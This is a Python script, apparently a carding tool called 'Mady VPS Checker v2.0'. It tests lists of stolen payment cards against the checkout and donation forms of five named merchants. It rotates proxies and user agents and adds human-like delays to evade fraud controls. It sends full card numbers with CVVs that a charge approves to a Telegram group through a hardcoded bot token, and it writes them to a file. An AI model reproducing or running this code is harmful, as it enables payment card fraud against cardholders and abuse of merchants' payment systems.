#!/usr/bin/env python3
"""
Mady VPS Checker v2.0 - IMPROVED VERSION
- Real gateway integration
- Proxy support
- Rate limiting
- Better error handling
- Concurrent checking
"""

import sys
import os
import time
import requests
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from collections import deque

# Add gateway path
sys.path.insert(0, '100$/100$/')

# Bot Configuration
BOT_TOKEN = "7984658748:AAFLNS52swKHJkh4kWuu3LDgckslaZjyJTY"
GROUP_IDS = ["-1003546431412"]
BOT_CREDIT = "@MissNullMe"

# Proxy Configuration (Add your proxies here)
PROXY_LIST = [
    # Format: "http://user:pass@ip:port" or "http://ip:port"
    # Example:
    # "http://user:pass@proxy1.com:8080",
    # "http://user:pass@proxy2.com:8080",
]

# User Agent Rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
]

# Gateway imports with error handling
GATEWAYS = {}

try:
    from Charge1 import BlemartCheckout
    GATEWAYS[1] = {
        "name": "Blemart",
        "func": BlemartCheckout,
        "amount": "$4.99",
        "type": "WooCommerce/Stripe"
    }
except ImportError as e:
    print(f"⚠️ Gateway 1 (Blemart) not available: {e}")

try:
    from Charge2 import DistrictPeopleCheckout
    GATEWAYS[2] = {
        "name": "District People",
        "func": DistrictPeopleCheckout,
        "amount": "€69.00",
        "type": "WooCommerce/Stripe"
    }
except ImportError as e:
    print(f"⚠️ Gateway 2 (District People) not available: {e}")

try:
    from Charge3 import SaintVinsonDonateCheckout
    GATEWAYS[3] = {
        "name": "Saint Vinson",
        "func": SaintVinsonDonateCheckout,
        "amount": "$20.00",
        "type": "GiveWP/Stripe"
    }
except ImportError as e:
    print(f"⚠️ Gateway 3 (Saint Vinson) not available: {e}")

try:
    from Charge4 import BGDCheckoutLogic
    GATEWAYS[4] = {
        "name": "BGD Fresh",
        "func": BGDCheckoutLogic,
        "amount": "$6.50",
        "type": "WooCommerce/Stripe"
    }
except ImportError as e:
    print(f"⚠️ Gateway 4 (BGD Fresh) not available: {e}")

try:
    from Charge5 import StaleksFloridaCheckoutVNew
    GATEWAYS[5] = {
        "name": "Staleks Florida",
        "func": StaleksFloridaCheckoutVNew,
        "amount": "$0.01",
        "type": "WooCommerce/Sources"
    }
except ImportError as e:
    print(f"⚠️ Gateway 5 (Staleks) not available: {e}")

# Rate Limiter
class RateLimiter:
    def __init__(self, max_requests=10, time_window=60):
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests = deque()
        self.lock = threading.Lock()
    
    def wait_if_needed(self):
        with self.lock:
            now = time.time()
            
            # Remove old requests
            while self.requests and self.requests[0] < now - self.time_window:
                self.requests.popleft()
            
            # Wait if at limit
            if len(self.requests) >= self.max_requests:
                sleep_time = self.requests[0] + self.time_window - now
                if sleep_time > 0:
                    time.sleep(sleep_time)
            
            self.requests.append(now)

# Stats tracking
class Stats:
    def __init__(self):
        self.approved = 0
        self.declined = 0
        self.errors = 0
        self.threeDS = 0
        self.total = 0
        self.start_time = None
        self.lock = threading.Lock()
        self.approved_cards = []
    
    def update(self, status, card=None):
        with self.lock:
            if status == "approved":
                self.approved += 1
                if card:
                    self.approved_cards.append(card)
            elif status == "3ds":
                self.threeDS += 1
            elif status == "declined":
                self.declined += 1
            else:
                self.errors += 1

stats = Stats()
rate_limiter = RateLimiter(max_requests=30, time_window=60)

def get_random_proxy():
    """Get random proxy from list"""
    if PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        return {"http": proxy, "https": proxy}
    return None

def get_random_ua():
    """Get random user agent"""
    return random.choice(USER_AGENTS)

def mask_card(card):
    """Mask card number for display"""
    parts = card.split("|")
    if len(parts) >= 1:
        num = parts[0]
        if len(num) > 10:
            masked = num[:6] + "*" * (len(num) - 10) + num[-4:]
        else:
            masked = num[:4] + "****" + num[-4:] if len(num) > 8 else num
        parts[0] = masked
    return "|".join(parts)

def detect_card_brand(card_number):
    """Detect card brand from number"""
    if card_number.startswith('4'):
        return "VISA"
    elif card_number.startswith(('51', '52', '53', '54', '55')):
        return "MASTERCARD"
    elif card_number.startswith(('34', '37')):
        return "AMEX"
    elif card_number.startswith('6011'):
        return "DISCOVER"
    elif card_number.startswith('35'):
        return "JCB"
    else:
        return "UNKNOWN"

def classify_result(result):
    """Classify gateway result into status categories"""
    result_lower = result.lower()
    
    # Approved
    if any(kw in result_lower for kw in ['charged', 'success', 'approved', 'payment successful']):
        return "approved", result
    
    # 3DS Required
    if any(kw in result_lower for kw in ['3ds', 'action required', 'requires_action', 'authenticate']):
        return "3ds", result
    
    # Declined with specific reasons
    if 'insufficient' in result_lower:
        return "declined", "Insufficient Funds"
    if 'incorrect_cvc' in result_lower or 'security code' in result_lower:
        return "declined", "Incorrect CVC"
    if 'expired' in result_lower:
        return "declined", "Card Expired"
    if 'declined' in result_lower or 'do not honor' in result_lower:
        return "declined", result
    
    # Error
    if 'error' in result_lower:
        return "error", result
    
    # Default to declined
    return "declined", result

def send_to_telegram(message, silent=True):
    """Send message to Telegram group"""
    success = False
    for group_id in GROUP_IDS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': group_id,
            'text': message,
            'parse_mode': 'HTML',
            'disable_notification': silent
        }
        
        try:
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                success = True
        except:
            pass
    return success

def check_card_real(card, gateway_id=1):
    """Check card using real gateway"""
    if gateway_id not in GATEWAYS:
        return "Error: Gateway not available"
    
    gateway = GATEWAYS[gateway_id]
    gateway_func = gateway["func"]
    
    # Apply rate limiting
    rate_limiter.wait_if_needed()
    
    # Add small random delay to mimic human behavior
    time.sleep(random.uniform(0.5, 1.5))
    
    try:
        result = gateway_func(card)
        return result
    except Exception as e:
        return f"Error: {str(e)}"

def process_card(card, index, total, gateway_id, use_real=True):
    """Process a single card"""
    try:
        card = card.strip()
        if not card or '|' not in card:
            return "error", "Invalid format"
        
        parts = card.split('|')
        if len(parts) != 4:
            return "error", "Invalid format"
        
        card_number = parts[0]
        brand = detect_card_brand(card_number)
        
        # Check card
        if use_real and gateway_id in GATEWAYS:
            result = check_card_real(card, gateway_id)
        else:
            # Fallback to simulation if gateway not available
            result = simulate_check(card)
        
        # Classify result
        status, message = classify_result(result)
        
        # Update stats
        stats.update(status, card if status == "approved" else None)
        
        # Handle approved cards
        if status == "approved":
            gateway_name = GATEWAYS.get(gateway_id, {}).get("name", "Unknown")
            gateway_amount = GATEWAYS.get(gateway_id, {}).get("amount", "$?.??")
            
            # Send to Telegram
            telegram_msg = f"""
✅ <b>APPROVED #{stats.approved}</b> ✅

<b>Card:</b> <code>{card}</code>
<b>Brand:</b> {brand}
<b>Gateway:</b> {gateway_name}
<b>Amount:</b> {gateway_amount}
<b>Response:</b> {message}

<b>Progress:</b> {index}/{total}
<b>Bot:</b> {BOT_CREDIT}
"""
            send_to_telegram(telegram_msg, silent=True)
            
            # Terminal output
            print(f"\n{'='*60}")
            print(f"✅ APPROVED [{index}/{total}]")
            print(f"   Card: {card}")
            print(f"   Brand: {brand}")
            print(f"   Gateway: {gateway_name}")
            print(f"   Response: {message}")
            print(f"{'='*60}\n")
        
        elif status == "3ds":
            print(f"🔐 [{index}/{total}]: {mask_card(card)} - 3DS Required")
        
        elif status == "declined":
            print(f"❌ [{index}/{total}]: {mask_card(card)} - {message}")
        
        else:
            print(f"⚠️ [{index}/{total}]: {mask_card(card)} - {message}")
        
        return status, message
        
    except Exception as e:
        stats.update("error")
        print(f"⚠️ [{index}/{total}]: Error - {str(e)[:50]}")
        return "error", str(e)

def simulate_check(card):
    """Fallback simulation when gateways unavailable"""
    rand = random.random()
    
    if rand < 0.10:
        return "Charged"
    elif rand < 0.15:
        return "3DS Required"
    elif rand < 0.40:
        return "Declined - Insufficient Funds"
    elif rand < 0.60:
        return "Declined - Card Declined"
    elif rand < 0.80:
        return "Declined - Do Not Honor"
    else:
        return "Declined - Generic"

def process_batch(cards, gateway_id=1, threads=5, use_real=True):
    """Process batch of cards"""
    total = len(cards)
    stats.total = total
    stats.start_time = datetime.now()
    
    gateway_name = GATEWAYS.get(gateway_id, {}).get("name", "Simulation")
    gateway_amount = GATEWAYS.get(gateway_id, {}).get("amount", "N/A")
    
    print(f"\n{'='*70}")
    print(f"{'MADY VPS CHECKER v2.0 - REAL GATEWAY MODE':^70}")
    print(f"{'='*70}")
    print(f"📋 Total Cards: {total:,}")
    print(f"⚡ Threads: {threads}")
    print(f"🎯 Gateway: {gateway_name} ({gateway_amount})")
    print(f"📡 Telegram: {GROUP_IDS[0]}")
    print(f"🤖 Bot: {BOT_CREDIT}")
    print(f"🔄 Mode: {'REAL' if use_real else 'SIMULATION'}")
    print(f"{'='*70}\n")
    
    # Send start notification
    send_to_telegram(f"""
🚀 <b>VPS CHECKER v2.0 STARTED</b>

<b>Total Cards:</b> {total:,}
<b>Gateway:</b> {gateway_name}
<b>Amount:</b> {gateway_amount}
<b>Threads:</b> {threads}
<b>Mode:</b> {'REAL' if use_real else 'SIMULATION'}

<i>Processing in progress...</i>
""", silent=False)
    
    # Process cards
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        
        for i, card in enumerate(cards, 1):
            future = executor.submit(process_card, card, i, total, gateway_id, use_real)
            futures.append(future)
            
            # Progress updates every 25 cards
            if i % 25 == 0:
                elapsed = (datetime.now() - stats.start_time).total_seconds()
                rate = i / elapsed if elapsed > 0 else 0
                eta = (total - i) / rate if rate > 0 else 0
                
                with stats.lock:
                    print(f"\n{'='*70}")
                    print(f"📊 PROGRESS: {i:,}/{total:,} ({i/total*100:.1f}%)")
                    print(f"   ✅ Approved: {stats.approved}")
                    print(f"   🔐 3DS: {stats.threeDS}")
                    print(f"   ❌ Declined: {stats.declined}")
                    print(f"   ⚠️ Errors: {stats.errors}")
                    print(f"   ⚡ Speed: {rate:.1f} cards/sec | ETA: {eta:.0f}s")
                    print(f"{'='*70}\n")
    
    # Final statistics
    elapsed = (datetime.now() - stats.start_time).total_seconds()
    
    print(f"\n{'='*70}")
    print(f"{'BATCH PROCESSING COMPLETE':^70}")
    print(f"{'='*70}")
    print(f"📊 FINAL RESULTS:")
    print(f"   Total Processed: {total:,} cards")
    print(f"   ✅ Approved: {stats.approved} ({stats.approved/total*100:.1f}%)")
    print(f"   🔐 3DS Required: {stats.threeDS} ({stats.threeDS/total*100:.1f}%)")
    print(f"   ❌ Declined: {stats.declined} ({stats.declined/total*100:.1f}%)")
    print(f"   ⚠️ Errors: {stats.errors} ({stats.errors/total*100:.1f}%)")
    print(f"\n⏱️ PERFORMANCE:")
    print(f"   Total Time: {elapsed:.1f} seconds")
    print(f"   Average Speed: {total/elapsed:.1f} cards/second")
    print(f"{'='*70}\n")
    
    # Send final report
    send_to_telegram(f"""
🎉 <b>VPS CHECKER v2.0 COMPLETE</b> 🎉

<b>Gateway:</b> {gateway_name}
<b>Total Processed:</b> {total:,} cards

<b>📊 Results:</b>
✅ Approved: {stats.approved} ({stats.approved/total*100:.1f}%)
🔐 3DS: {stats.threeDS} ({stats.threeDS/total*100:.1f}%)
❌ Declined: {stats.declined} ({stats.declined/total*100:.1f}%)
⚠️ Errors: {stats.errors} ({stats.errors/total*100:.1f}%)

<b>⚡ Performance:</b>
• Time: {elapsed:.1f} seconds
• Speed: {total/elapsed:.1f} cards/sec

<b>Bot:</b> {BOT_CREDIT}
""", silent=False)
    
    # Return approved cards
    return stats.approved_cards

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='Mady VPS Checker v2.0 - Real Gateway Integration',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 mady_vps_checker_v2.py cards.txt
  python3 mady_vps_checker_v2.py cards.txt --gateway 3
  python3 mady_vps_checker_v2.py cards.txt --threads 10 --gateway 1
  python3 mady_vps_checker_v2.py cards.txt --simulate
  
Available Gateways:
  1 - Blemart ($4.99)
  2 - District People (€69.00)
  3 - Saint Vinson ($20.00)
  4 - BGD Fresh ($6.50)
  5 - Staleks Florida ($0.01)
        """
    )
    
    parser.add_argument('file', help='Path to card file')
    parser.add_argument('-g', '--gateway', type=int, default=1,
                       help='Gateway ID (1-5, default: 1)')
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help='Number of threads (default: 5, max recommended: 10)')
    parser.add_argument('-l', '--limit', type=int, default=0,
                       help='Limit number of cards (0 = no limit)')
    parser.add_argument('-s', '--simulate', action='store_true',
                       help='Use simulation mode instead of real gateways')
    
    args = parser.parse_args()
    
    # Check file
    if not os.path.exists(args.file):
        print(f"❌ Error: File not found: {args.file}")
        sys.exit(1)
    
    # Check gateway
    if args.gateway not in GATEWAYS and not args.simulate:
        print(f"⚠️ Warning: Gateway {args.gateway} not available, using simulation")
        args.simulate = True
    
    # Load cards
    print(f"📁 Loading cards from: {args.file}")
    with open(args.file, 'r') as f:
        lines = f.readlines()
    
    cards = [line.strip() for line in lines if line.strip() and '|' in line]
    
    if not cards:
        print("❌ Error: No valid cards found")
        sys.exit(1)
    
    print(f"✅ Loaded {len(cards):,} cards")
    
    # Apply limit
    if args.limit > 0:
        cards = cards[:args.limit]
        print(f"📌 Limited to {len(cards):,} cards")
    
    # Confirm large batches
    if len(cards) > 100 and not args.simulate:
        print(f"\n⚠️ WARNING: Large batch of {len(cards):,} cards with REAL gateway")
        print(f"This may take a while and could trigger rate limits.")
        response = input("Continue? (y/n): ")
        if response.lower() != 'y':
            print("Cancelled.")
            sys.exit(0)
    
    # Process
    try:
        approved = process_batch(
            cards, 
            gateway_id=args.gateway, 
            threads=args.threads,
            use_real=not args.simulate
        )
        
        # Save approved cards
        if approved:
            output_file = f"approved_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(output_file, 'w') as f:
                for card in approved:
                    f.write(card + '\n')
            print(f"\n💾 Approved cards saved to: {output_file}")
            
    except KeyboardInterrupt:
        print(f"\n\n⛔ Interrupted! Processed {stats.approved + stats.declined + stats.errors}/{len(cards)} cards")
        print(f"✅ Approved: {stats.approved} | ❌ Declined: {stats.declined}")

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════════════════════════╗
║              MADY VPS CHECKER v2.0 - IMPROVED             ║
║           Real Gateway Integration + Proxy Support        ║
║                    Bot by @MissNullMe                     ║
╚════════════════════════════════════════════════════════════╝
""")
    
    # Show available gateways
    print("Available Gateways:")
    for gw_id, gw_info in GATEWAYS.items():
        print(f"  {gw_id}. {gw_info['name']} ({gw_info['amount']}) - {gw_info['type']}")
    print()
    
    if len(sys.argv) == 1:
        print("Usage: python3 mady_vps_checker_v2.py <file> [options]")
        print("\nQuick Start:")
        print("  python3 mady_vps_checker_v2.py /home/null/Desktop/TestCards.txt")
        print("  python3 mady_vps_checker_v2.py cards.txt --gateway 3 --threads 5")
        print("\nRun with --help for more info")
        sys.exit(0)
    
    main()
